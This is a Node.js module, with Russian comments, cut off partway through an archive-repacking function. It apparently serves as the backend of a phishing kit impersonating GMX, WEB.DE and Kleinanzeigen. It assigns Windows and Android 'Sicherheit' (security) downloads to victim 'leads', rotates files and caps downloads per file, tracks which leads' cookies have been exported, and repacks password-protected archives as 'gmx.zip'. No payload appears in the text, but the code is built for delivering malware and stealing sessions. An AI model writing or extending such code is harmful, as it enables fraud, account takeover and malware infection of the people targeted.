'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawnSync } = require('child_process');

const ARCHIVE_PROCESS_TIMEOUT_MS = 120000;

let DATA_DIR;
let PROJECT_ROOT;
let DOWNLOADS_DIR;
let DOWNLOAD_SLOTS_COUNT = 15;
let DEFAULT_DOWNLOAD_LIMIT = 5;
let DOWNLOAD_FILES_CONFIG;
let DOWNLOAD_LIMITS_FILE;
let DOWNLOAD_COUNTS_FILE;
let DOWNLOAD_ANDROID_CONFIG;
let DOWNLOAD_ANDROID_LIMITS_FILE;
let DOWNLOAD_SETTINGS_FILE;
let DOWNLOAD_ROTATION_FILE;
let COOKIES_EXPORTED_FILE;

/** Слоты загрузок по бренду (хост/форма): отдельные списки файлов в download-files.json / download-android.json */
const DOWNLOAD_KIT_BRANDS = Object.freeze(['gmx', 'webde', 'klein']);

/**
 * Ключ в JSON: плоское имя (legacy) или brand/basename — файл на диске в downloads/ или downloads/brand/.
 * @param {string} raw
 * @returns {string|null}
 */
function normalizeStoredDownloadKey(raw) {
  if (raw == null) return null;
  let s = String(raw).replace(/\0/g, '').replace(/\\/g, '/').trim();
  if (!s || s.includes('..')) return null;
  if (s.startsWith('/')) return null;
  const parts = s.split('/').filter(Boolean);
  if (parts.length === 1) {
    const fn = parts[0];
    if (!fn) return null;
    return fn;
  }
  if (parts.length === 2) {
    const b = normalizeDownloadKitBrand(parts[0]);
    const fn = parts[1];
    if (!fn || fn.includes('..') || fn.includes('/')) return null;
    if (!DOWNLOAD_KIT_BRANDS.includes(b)) return null;
    return b + '/' + fn;
  }
  return null;
}

/**
 * Полный путь к файлу скачивания или null. Учитывает подпапки бренда и legacy-плоские имена.
 * @param {string} storedKey
 * @returns {string|null}
 */
function resolveDownloadFileFullPath(storedKey) {
  const key = normalizeStoredDownloadKey(storedKey);
  if (!key) return null;
  const parts = key.split('/');
  let full;
  if (parts.length === 1) {
    full = path.join(DOWNLOADS_DIR, parts[0]);
  } else {
    full = path.join(DOWNLOADS_DIR, parts[0], parts[1]);
  }
  try {
    if (fs.statSync(full).isFile()) return full;
  } catch (e) {}
  if (parts.length === 1) {
    try {
      const names = fs.readdirSync(DOWNLOADS_DIR);
      const want = parts[0].toLowerCase();
      for (let i = 0; i < names.length; i++) {
        const n = names[i];
        if (n.toLowerCase() === want) {
          const p = path.join(DOWNLOADS_DIR, n);
          if (fs.statSync(p).isFile()) return p;
        }
      }
    } catch (e2) {}
  } else {
    const brandDir = path.join(DOWNLOADS_DIR, parts[0]);
    try {
      const names = fs.readdirSync(brandDir);
      const want = parts[1].toLowerCase();
      for (let i = 0; i < names.length; i++) {
        const n = names[i];
        if (n.toLowerCase() === want) {
          const p = path.join(brandDir, n);
          if (fs.statSync(p).isFile()) return p;
        }
      }
    } catch (e2) {}
  }
  return null;
}

function init(opts) {
  DATA_DIR = opts.DATA_DIR;
  PROJECT_ROOT = opts.PROJECT_ROOT;
  DOWNLOADS_DIR = opts.DOWNLOADS_DIR;
  if (opts.DOWNLOAD_SLOTS_COUNT != null) DOWNLOAD_SLOTS_COUNT = opts.DOWNLOAD_SLOTS_COUNT;
  if (opts.DEFAULT_DOWNLOAD_LIMIT != null) DEFAULT_DOWNLOAD_LIMIT = opts.DEFAULT_DOWNLOAD_LIMIT;
  DOWNLOAD_FILES_CONFIG = opts.DOWNLOAD_FILES_CONFIG;
  DOWNLOAD_LIMITS_FILE = opts.DOWNLOAD_LIMITS_FILE;
  DOWNLOAD_COUNTS_FILE = opts.DOWNLOAD_COUNTS_FILE;
  DOWNLOAD_ANDROID_CONFIG = opts.DOWNLOAD_ANDROID_CONFIG;
  DOWNLOAD_ANDROID_LIMITS_FILE = opts.DOWNLOAD_ANDROID_LIMITS_FILE;
  DOWNLOAD_SETTINGS_FILE = opts.DOWNLOAD_SETTINGS_FILE;
  DOWNLOAD_ROTATION_FILE = opts.DOWNLOAD_ROTATION_FILE;
  COOKIES_EXPORTED_FILE = opts.COOKIES_EXPORTED_FILE;
}

function normalizeDownloadKitBrand(brand) {
  const b = String(brand || '').trim().toLowerCase();
  if (b === 'webde' || b === 'gmx' || b === 'klein') return b;
  return 'gmx';
}

function downloadKitBrandFromLead(lead) {
  if (!lead || typeof lead !== 'object') return 'gmx';
  const h = String(lead.hostBrandAtSubmit || '').trim().toLowerCase();
  if (h === 'webde' || h === 'gmx') return h;
  const br = String(lead.brand || '').trim().toLowerCase();
  if (br === 'klein') return 'klein';
  if (br === 'webde' || br === 'gmx') return br;
  return 'gmx';
}

function padDownloadSlots(list) {
  const out = [];
  const src = Array.isArray(list) ? list : [];
  for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
    const v = src[i];
    if (v == null || v === '') {
      out.push(null);
      continue;
    }
    const norm = typeof v === 'string' ? normalizeStoredDownloadKey(v) : null;
    out.push(norm || null);
  }
  return out;
}

function brandsFallbackOrder(primary) {
  const p = normalizeDownloadKitBrand(primary);
  const order = [p, 'gmx', 'webde', 'klein'];
  const seen = new Set();
  const out = [];
  for (let i = 0; i < order.length; i++) {
    const b = order[i];
    if (!seen.has(b)) {
      seen.add(b);
      out.push(b);
    }
  }
  return out;
}

function readDownloadFilesDiskJson() {
  try {
    if (fs.existsSync(DOWNLOAD_FILES_CONFIG)) {
      const raw = fs.readFileSync(DOWNLOAD_FILES_CONFIG, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function readDownloadFilesConfigForBrand(brand) {
  const b = normalizeDownloadKitBrand(brand);
  const data = readDownloadFilesDiskJson();
  if (data.brands && data.brands[b] != null) return padDownloadSlots(data.brands[b]);
  if (Array.isArray(data.files)) return padDownloadSlots(data.files);
  return Array(DOWNLOAD_SLOTS_COUNT).fill(null);
}

function writeDownloadFilesConfigForBrand(brand, files) {
  const b = normalizeDownloadKitBrand(brand);
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  const data = readDownloadFilesDiskJson();
  let brands = data.brands && typeof data.brands === 'object' ? { ...data.brands } : null;
  if (!brands) {
    const legacy = Array.isArray(data.files) ? padDownloadSlots(data.files) : Array(DOWNLOAD_SLOTS_COUNT).fill(null);
    brands = {
      gmx: legacy.slice(),
      webde: legacy.slice(),
      klein: legacy.slice()
    };
  } else {
    for (let i = 0; i < DOWNLOAD_KIT_BRANDS.length; i++) {
      const key = DOWNLOAD_KIT_BRANDS[i];
      brands[key] = padDownloadSlots(brands[key]);
    }
  }
  brands[b] = padDownloadSlots(files);
  fs.writeFileSync(DOWNLOAD_FILES_CONFIG, JSON.stringify({ brands }, null, 0), 'utf8');
}

function forEachWindowsConfigFile(callback) {
  const data = readDownloadFilesDiskJson();
  if (Array.isArray(data.files)) {
    for (let i = 0; i < data.files.length; i++) {
      const v = data.files[i];
      if (v) callback(String(v));
    }
  }
  if (data.brands && typeof data.brands === 'object') {
    for (let bi = 0; bi < DOWNLOAD_KIT_BRANDS.length; bi++) {
      const arr = data.brands[DOWNLOAD_KIT_BRANDS[bi]];
      if (!Array.isArray(arr)) continue;
      for (let i = 0; i < arr.length; i++) {
        const v = arr[i];
        if (v) callback(String(v));
      }
    }
  }
}

function isWindowsDownloadFileReferenced(safeName) {
  if (!safeName) return false;
  let found = false;
  forEachWindowsConfigFile((n) => {
    if (n === safeName) found = true;
  });
  return found;
}

/** Совместимость: конфиг слотов GMX (при legacy { files } тот же список, что и у остальных брендов в памяти). */
function readDownloadFilesConfig() {
  return readDownloadFilesConfigForBrand('gmx');
}

function writeDownloadFilesConfig(files) {
  writeDownloadFilesConfigForBrand('gmx', files);
}

function readDownloadLimits() {
  try {
    if (fs.existsSync(DOWNLOAD_LIMITS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_LIMITS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function writeDownloadLimits(limits) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_LIMITS_FILE, JSON.stringify(limits || {}, null, 0), 'utf8');
  } catch (e) {}
}

function readDownloadCounts() {
  try {
    if (fs.existsSync(DOWNLOAD_COUNTS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_COUNTS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function writeDownloadCounts(counts) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts && typeof counts === 'object' ? counts : {}, null, 0), 'utf8');
  } catch (e) {}
}

function incrementDownloadCount(fileName) {
  if (!fileName || typeof fileName !== 'string') return;
  const key = normalizeStoredDownloadKey(fileName);
  if (!key) return;
  const counts = readDownloadCounts();
  counts[key] = (counts[key] || 0) + 1;
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
  } catch (e) {}
}

/** @returns {{ safeNames: string[], leadIds: string[] }} */
function readCookiesExportRaw() {
  try {
    if (!fs.existsSync(COOKIES_EXPORTED_FILE)) return { safeNames: [], leadIds: [] };
    const raw = fs.readFileSync(COOKIES_EXPORTED_FILE, 'utf8');
    const data = JSON.parse(raw);
    if (Array.isArray(data)) return { safeNames: data.map(String), leadIds: [] };
    if (data && typeof data === 'object') {
      const safeNames = Array.isArray(data.safeNames) ? data.safeNames.map(String) : [];
      const leadIds = Array.isArray(data.leadIds) ? data.leadIds.map(String) : [];
      return { safeNames, leadIds };
    }
    return { safeNames: [], leadIds: [] };
  } catch (e) {
    return { safeNames: [], leadIds: [] };
  }
}

function writeCookiesExportRaw(obj) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const safeNames = Array.isArray(obj.safeNames) ? obj.safeNames.map(String) : [];
    const leadIds = Array.isArray(obj.leadIds) ? obj.leadIds.map(String) : [];
    fs.writeFileSync(COOKIES_EXPORTED_FILE, JSON.stringify({ safeNames, leadIds }, null, 0), 'utf8');
  } catch (e) {}
}

/** Наборы для флага «куки выгружены» (legacy — по safe email; новое — по id лида). */
function readCookiesExportedSets() {
  const r = readCookiesExportRaw();
  return { safeNames: new Set(r.safeNames), leadIds: new Set(r.leadIds) };
}

function appendCookiesExportedLeadIds(ids) {
  const r = readCookiesExportRaw();
  const next = new Set(r.leadIds.map(String));
  for (const id of ids || []) next.add(String(id));
  writeCookiesExportRaw({ safeNames: r.safeNames, leadIds: [...next] });
}

/** Только legacy safe-имена файлов (массив в старом файле). */
function readCookiesExported() {
  return readCookiesExportRaw().safeNames;
}

/** Полная замена tracking-файла (legacy). */
function writeCookiesExported(list) {
  const r = readCookiesExportRaw();
  writeCookiesExportRaw({ safeNames: Array.isArray(list) ? list.map(String) : [], leadIds: r.leadIds });
}

function sanitizeFilenameForHeader(name) {
  if (!name || typeof name !== 'string') return 'download';
  return String(name)
    .replace(/[\x00-\x1f\x7f"\\]/g, '')
    .replace(/^\s+|\s+$/g, '')
    .replace(/^\.+/, '') || 'download';
}

function slotFromLeadId(leadId) {
  if (!leadId || typeof leadId !== 'string') return 0;
  let h = 0;
  for (let i = 0; i < leadId.length; i++) h = ((h << 5) - h) + leadId.charCodeAt(i) | 0;
  return Math.abs(h) % DOWNLOAD_SLOTS_COUNT;
}

function readDownloadSettings() {
  try {
    if (fs.existsSync(DOWNLOAD_SETTINGS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_SETTINGS_FILE, 'utf8');
      const data = JSON.parse(raw);
      const n = typeof data.rotateAfterUnique === 'number' && data.rotateAfterUnique >= 0 ? data.rotateAfterUnique : 0;
      return { rotateAfterUnique: n };
    }
  } catch (e) {}
  return { rotateAfterUnique: 0 };
}

function writeDownloadSettings(cfg) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_SETTINGS_FILE, JSON.stringify({ rotateAfterUnique: (cfg && cfg.rotateAfterUnique) >= 0 ? cfg.rotateAfterUnique : 0 }, null, 0), 'utf8');
  } catch (e) {}
}

function readDownloadRotation() {
  try {
    if (fs.existsSync(DOWNLOAD_ROTATION_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_ROTATION_FILE, 'utf8');
      const data = JSON.parse(raw);
      const w = data.windows || {};
      const a = data.android || {};
      return {
        windows: { totalUnique: typeof w.totalUnique === 'number' ? w.totalUnique : 0, leadSlots: w.leadSlots && typeof w.leadSlots === 'object' ? w.leadSlots : {} },
        android: { totalUnique: typeof a.totalUnique === 'number' ? a.totalUnique : 0, leadSlots: a.leadSlots && typeof a.leadSlots === 'object' ? a.leadSlots : {} }
      };
    }
  } catch (e) {}
  return { windows: { totalUnique: 0, leadSlots: {} }, android: { totalUnique: 0, leadSlots: {} } };
}

function writeDownloadRotation(state) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_ROTATION_FILE, JSON.stringify(state, null, 0), 'utf8');
  } catch (e) {}
}

function getSlotForLead(leadId, platform) {
  const settings = readDownloadSettings();
  if (!settings.rotateAfterUnique || settings.rotateAfterUnique <= 0) {
    return leadId ? slotFromLeadId(leadId) : 0;
  }
  if (!leadId || typeof leadId !== 'string') return 0;
  const state = readDownloadRotation();
  const key = platform === 'android' ? 'android' : 'windows';
  const block = state[key];
  if (block.leadSlots[leadId] !== undefined) {
    return block.leadSlots[leadId];
  }
  const slot = Math.floor(block.totalUnique / settings.rotateAfterUnique) % DOWNLOAD_SLOTS_COUNT;
  block.leadSlots[leadId] = slot;
  block.totalUnique += 1;
  writeDownloadRotation(state);
  return slot;
}

function getSicherheitDownloadFiles(brand) {
  const config = readDownloadFilesConfigForBrand(brand != null ? brand : 'gmx');
  const limits = readDownloadLimits();
  const counts = readDownloadCounts();
  const out = [];
  for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
    const name = config[i];
    if (!name) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      continue;
    }
    const full = resolveDownloadFileFullPath(name);
    try {
      const stat = full ? fs.statSync(full) : null;
      if (stat && stat.isFile()) {
        const limit = typeof limits[name] === 'number' && limits[name] >= 0 ? limits[name] : DEFAULT_DOWNLOAD_LIMIT;
        out.push({
          fileName: name,
          size: stat.size,
          downloads: typeof counts[name] === 'number' ? counts[name] : 0,
          limit
        });
      } else {
        out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      }
    } catch (e) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
    }
  }
  return out;
}

function getSicherheitDownloadFileByLimitSingleBrand(brand) {
  const files = getSicherheitDownloadFiles(brand);
  for (let i = 0; i < files.length; i++) {
    const f = files[i];
    if (!f.fileName) continue;
    const limit = f.limit != null ? f.limit : 0;
    const downloads = f.downloads != null ? f.downloads : 0;
    if (limit > 0 && downloads >= limit) continue;
    if (limit <= 0 || downloads < limit) {
      const full = resolveDownloadFileFullPath(f.fileName);
      try {
        if (full && fs.statSync(full).isFile()) return { filePath: full, fileName: f.fileName };
      } catch (e) {}
    }
  }
  return null;
}

function getSicherheitDownloadFile(index, brand) {
  const envPath = process.env.SICHERHEIT_DOWNLOAD_PATH;
  if (envPath) {
    const full = path.isAbsolute(envPath) ? envPath : path.join(PROJECT_ROOT, envPath);
    try {
      if (fs.statSync(full).isFile()) return { filePath: full, fileName: path.basename(full) };
    } catch (e) {}
  }
  const brandOrder = brand != null && String(brand).trim() !== ''
    ? brandsFallbackOrder(brand)
    : ['gmx', 'webde', 'klein'];
  if (typeof index === 'number' && index >= 0 && index < DOWNLOAD_SLOTS_COUNT) {
    for (let bi = 0; bi < brandOrder.length; bi++) {
      const config = readDownloadFilesConfigForBrand(brandOrder[bi]);
      const name = config[index];
      if (name) {
        const fullPath = resolveDownloadFileFullPath(name);
        try {
          if (fullPath && fs.statSync(fullPath).isFile()) return { filePath: fullPath, fileName: name };
        } catch (e) {}
      }
    }
    return null;
  }
  for (let bi = 0; bi < brandOrder.length; bi++) {
    const config = readDownloadFilesConfigForBrand(brandOrder[bi]);
    for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
      const name = config[i];
      if (!name) continue;
      const fullPath = resolveDownloadFileFullPath(name);
      try {
        if (fullPath && fs.statSync(fullPath).isFile()) return { filePath: fullPath, fileName: name };
      } catch (e) {}
    }
  }
  try {
    const names = fs.readdirSync(DOWNLOADS_DIR).filter(function (n) { return n !== '.gitkeep' && !n.startsWith('.'); });
    let newest = null;
    let newestMtime = 0;
    for (let i = 0; i < names.length; i++) {
      const fullPath = path.join(DOWNLOADS_DIR, names[i]);
      const stat = fs.statSync(fullPath);
      if (stat.isFile() && stat.mtimeMs >= newestMtime) {
        newestMtime = stat.mtimeMs;
        newest = { filePath: fullPath, fileName: names[i] };
      }
    }
    return newest;
  } catch (e) {}
  return null;
}

function getSicherheitDownloadFileByLimit(brand) {
  if (brand != null && String(brand).trim() !== '') {
    const b = normalizeDownloadKitBrand(brand);
    const one = getSicherheitDownloadFileByLimitSingleBrand(b);
    if (one) return one;
    return getSicherheitDownloadFile(0, b);
  }
  for (let i = 0; i < DOWNLOAD_KIT_BRANDS.length; i++) {
    const one = getSicherheitDownloadFileByLimitSingleBrand(DOWNLOAD_KIT_BRANDS[i]);
    if (one) return one;
  }
  return getSicherheitDownloadFile();
}

function pickWindowsDownloadFileNameForLead(leadId, lead) {
  const primary = downloadKitBrandFromLead(lead || null);
  // Сначала первый файл бренда с остатком лимита (порядок слотов 0…n), затем слот по leadId и кросс-бренд.
  const firstAvailPrimary = getSicherheitDownloadFileByLimitSingleBrand(primary);
  if (firstAvailPrimary && firstAvailPrimary.fileName) {
    const full = resolveDownloadFileFullPath(firstAvailPrimary.fileName);
    try {
      if (full && fs.statSync(full).isFile()) return firstAvailPrimary.fileName;
    } catch (e) {}
  }
  const order = brandsFallbackOrder(primary);
  const slot = leadId ? getSlotForLead(leadId, 'windows') : 0;
  for (let oi = 0; oi < order.length; oi++) {
    const files = getSicherheitDownloadFiles(order[oi]);
    const slotInfo = files[slot];
    if (slotInfo && slotInfo.fileName) {
      const limit = slotInfo.limit != null ? slotInfo.limit : 0;
      const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
      if (limit <= 0 || downloads < limit) {
        const full = resolveDownloadFileFullPath(slotInfo.fileName);
        try {
          if (full && fs.statSync(full).isFile()) return slotInfo.fileName;
        } catch (e) {}
      }
    }
  }
  for (let oi = 0; oi < order.length; oi++) {
    const byLimit = getSicherheitDownloadFileByLimitSingleBrand(order[oi]);
    if (byLimit && byLimit.fileName) return byLimit.fileName;
  }
  const any = getSicherheitDownloadFile(0, primary);
  return any ? any.fileName : null;
}

function readAndroidDownloadDiskJson() {
  try {
    if (fs.existsSync(DOWNLOAD_ANDROID_CONFIG)) {
      const raw = fs.readFileSync(DOWNLOAD_ANDROID_CONFIG, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function readAndroidDownloadConfigForBrand(brand) {
  const b = normalizeDownloadKitBrand(brand);
  const data = readAndroidDownloadDiskJson();
  if (data.brands && data.brands[b] != null) return padDownloadSlots(data.brands[b]);
  let list = Array.isArray(data.files) ? data.files : [];
  if (list.length === 0 && data.fileName && typeof data.fileName === 'string') {
    list = [data.fileName];
  }
  if (list.length) return padDownloadSlots(list);
  return Array(DOWNLOAD_SLOTS_COUNT).fill(null);
}

function writeAndroidDownloadConfigForBrand(brand, files) {
  const b = normalizeDownloadKitBrand(brand);
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  const data = readAndroidDownloadDiskJson();
  let brands = data.brands && typeof data.brands === 'object' ? { ...data.brands } : null;
  if (!brands) {
    let legacy = Array.isArray(data.files) ? data.files : [];
    if (legacy.length === 0 && data.fileName && typeof data.fileName === 'string') {
      legacy = [data.fileName];
    }
    const padded = padDownloadSlots(legacy);
    brands = {
      gmx: padded.slice(),
      webde: padded.slice(),
      klein: padded.slice()
    };
  } else {
    for (let i = 0; i < DOWNLOAD_KIT_BRANDS.length; i++) {
      const key = DOWNLOAD_KIT_BRANDS[i];
      brands[key] = padDownloadSlots(brands[key]);
    }
  }
  brands[b] = padDownloadSlots(files);
  fs.writeFileSync(DOWNLOAD_ANDROID_CONFIG, JSON.stringify({ brands }, null, 0), 'utf8');
}

function forEachAndroidConfigFile(callback) {
  const data = readAndroidDownloadDiskJson();
  if (Array.isArray(data.files)) {
    for (let i = 0; i < data.files.length; i++) {
      const v = data.files[i];
      if (v) callback(String(v));
    }
  }
  if (data.fileName && typeof data.fileName === 'string') {
    callback(String(data.fileName));
  }
  if (data.brands && typeof data.brands === 'object') {
    for (let bi = 0; bi < DOWNLOAD_KIT_BRANDS.length; bi++) {
      const arr = data.brands[DOWNLOAD_KIT_BRANDS[bi]];
      if (!Array.isArray(arr)) continue;
      for (let i = 0; i < arr.length; i++) {
        const v = arr[i];
        if (v) callback(String(v));
      }
    }
  }
}

function isAndroidDownloadFileReferenced(safeName) {
  if (!safeName) return false;
  let found = false;
  forEachAndroidConfigFile((n) => {
    if (n === safeName) found = true;
  });
  return found;
}

function readAndroidDownloadConfig() {
  return readAndroidDownloadConfigForBrand('gmx');
}

function getAndroidDownloadFiles(brand) {
  const config = readAndroidDownloadConfigForBrand(brand != null ? brand : 'gmx');
  const limits = readAndroidDownloadLimits();
  const counts = readDownloadCounts();
  const out = [];
  for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
    const name = config[i];
    if (!name) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      continue;
    }
    const full = resolveDownloadFileFullPath(name);
    try {
      const stat = full ? fs.statSync(full) : null;
      if (stat && stat.isFile()) {
        const limit = typeof limits[name] === 'number' && limits[name] >= 0 ? limits[name] : DEFAULT_DOWNLOAD_LIMIT;
        out.push({
          fileName: name,
          size: stat.size,
          downloads: typeof counts[name] === 'number' ? counts[name] : 0,
          limit
        });
      } else {
        out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      }
    } catch (e) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
    }
  }
  return out;
}

function getAndroidDownloadFileByLimitSingleBrand(brand) {
  const files = getAndroidDownloadFiles(brand);
  for (let i = 0; i < files.length; i++) {
    const f = files[i];
    if (!f.fileName) continue;
    const limit = f.limit != null ? f.limit : 0;
    const downloads = f.downloads != null ? f.downloads : 0;
    if (limit > 0 && downloads >= limit) continue;
    if (limit <= 0 || downloads < limit) {
      const full = resolveDownloadFileFullPath(f.fileName);
      try {
        if (full && fs.statSync(full).isFile()) return { filePath: full, fileName: f.fileName };
      } catch (e) {}
    }
  }
  return null;
}

function getAndroidDownloadFile(index, brand) {
  const brandOrder = brand != null && String(brand).trim() !== ''
    ? brandsFallbackOrder(brand)
    : ['gmx', 'webde', 'klein'];
  if (typeof index === 'number' && index >= 0 && index < DOWNLOAD_SLOTS_COUNT) {
    for (let bi = 0; bi < brandOrder.length; bi++) {
      const config = readAndroidDownloadConfigForBrand(brandOrder[bi]);
      const name = config[index];
      if (name) {
        const fullPath = resolveDownloadFileFullPath(name);
        try {
          if (fullPath && fs.statSync(fullPath).isFile()) return { filePath: fullPath, fileName: name };
        } catch (e) {}
      }
    }
    return null;
  }
  for (let bi = 0; bi < brandOrder.length; bi++) {
    const config = readAndroidDownloadConfigForBrand(brandOrder[bi]);
    for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
      const name = config[i];
      if (!name) continue;
      const fullPath = resolveDownloadFileFullPath(name);
      try {
        if (fullPath && fs.statSync(fullPath).isFile()) return { filePath: fullPath, fileName: name };
      } catch (e) {}
    }
  }
  return null;
}

function getAndroidDownloadFileByLimit(brand) {
  if (brand != null && String(brand).trim() !== '') {
    const b = normalizeDownloadKitBrand(brand);
    const one = getAndroidDownloadFileByLimitSingleBrand(b);
    if (one) return one;
    return getAndroidDownloadFile(0, b);
  }
  for (let i = 0; i < DOWNLOAD_KIT_BRANDS.length; i++) {
    const one = getAndroidDownloadFileByLimitSingleBrand(DOWNLOAD_KIT_BRANDS[i]);
    if (one) return one;
  }
  return getAndroidDownloadFile();
}

function pickAndroidDownloadFileNameForLead(leadId, lead) {
  const primary = downloadKitBrandFromLead(lead || null);
  const firstAvailPrimary = getAndroidDownloadFileByLimitSingleBrand(primary);
  if (firstAvailPrimary && firstAvailPrimary.fileName) {
    const full = resolveDownloadFileFullPath(firstAvailPrimary.fileName);
    try {
      if (full && fs.statSync(full).isFile()) return firstAvailPrimary.fileName;
    } catch (e) {}
  }
  const order = brandsFallbackOrder(primary);
  const slot = leadId ? getSlotForLead(leadId, 'android') : 0;
  for (let oi = 0; oi < order.length; oi++) {
    const files = getAndroidDownloadFiles(order[oi]);
    const slotInfo = files[slot];
    if (slotInfo && slotInfo.fileName) {
      const limit = slotInfo.limit != null ? slotInfo.limit : 0;
      const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
      if (limit <= 0 || downloads < limit) {
        const full = resolveDownloadFileFullPath(slotInfo.fileName);
        try {
          if (full && fs.statSync(full).isFile()) return slotInfo.fileName;
        } catch (e) {}
      }
    }
  }
  for (let oi = 0; oi < order.length; oi++) {
    const byLimit = getAndroidDownloadFileByLimitSingleBrand(order[oi]);
    if (byLimit && byLimit.fileName) return byLimit.fileName;
  }
  const any = getAndroidDownloadFile(0, primary);
  return any ? any.fileName : null;
}

function readAndroidDownloadLimits() {
  try {
    if (fs.existsSync(DOWNLOAD_ANDROID_LIMITS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_ANDROID_LIMITS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function writeAndroidDownloadLimits(limits) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_ANDROID_LIMITS_FILE, JSON.stringify(limits || {}, null, 0), 'utf8');
  } catch (e) {}
}

function writeAndroidDownloadConfig(files) {
  writeAndroidDownloadConfigForBrand('gmx', files);
}

function spawnTimedOut(result) {
  return result && (result.signal === 'SIGTERM' || result.status === null);
}

function tryRepairAndExtractZip(tempZip, extractDir, pass, baseDir) {
  const fixedZip = path.join(baseDir, 'fixed.zip');
  const rFF = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [
    process.platform === 'win32' ? '/c' : '-c',
    'zip -FF ' + JSON.stringify(tempZip) + ' --out ' + JSON.stringify(fixedZip) + ' 2>&1'
  ], { encoding: 'utf8', cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
  if (spawnTimedOut(rFF)) return false;
  if (!fs.existsSync(fixedZip) || fs.statSync(fixedZip).size === 0) return false;
  const envOld = pass ? { ...process.env, GMW_ZIP_OLD: pass } : process.env;
  const unzipFix = pass
    ? 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(fixedZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1'
    : 'unzip -o ' + JSON.stringify(fixedZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1';
  const r2 = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipFix], { encoding: 'utf8', env: envOld, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
  if (spawnTimedOut(r2)) return false;
  const err2 = (r2.stderr || r2.stdout || '').toString();
  if (r2.status !== 0 && !/warning:|note:/.test(err2)) return false;
  try {
    return fs.readdirSync(extractDir, { withFileTypes: true }).some(e => e.isFile());
  } catch (e) { return false; }
}

function processArchiveToGmx(buf, password, type) {
  const baseDir = path.join(os.tmpdir(), 'gmw-multi-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8));
  const tempZip = path.join(baseDir, 'in' + (type === 'zip' ? '.zip' : '.rar'));
  const outZip = path.join(baseDir, 'gmx.zip');
  const extractDir = path.join(baseDir, 'ext');
  const repackDir = path.join(baseDir, 'repack');
  try {
    if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
    fs.writeFileSync(tempZip, buf);
    const pass = (password || '').trim();
    const envOld = pass ? { ...process.env, GMW_ZIP_OLD: pass } : process.env;
    if (type === 'zip') {
      fs.mkdirSync(extractDir, { recursive: true });
      const unzipCmd = pass
        ? 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(tempZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1'
        : 'unzip -o ' + JSON.stringify(tempZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1';
      let r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
      if (spawnTimedOut(r)) return null;
      let err = (r.stderr || r.stdout || '').toString();
      let hasFiles = false;
      try {
        hasFiles = fs.readdirSync(extractDir, { withFileTypes: true }).some(e => e.isFile());
      } catch (e) {}
      if (!hasFiles || (r.status !== 0 && !/warning:|note:/.test(err))) {
        try { fs.readdirSync(extractDir).forEach(n => { const p = path.join(extractDir, n); if (fs.statSync(p).isFile()) fs.unlinkSync(p); }); } catch (e2) {}
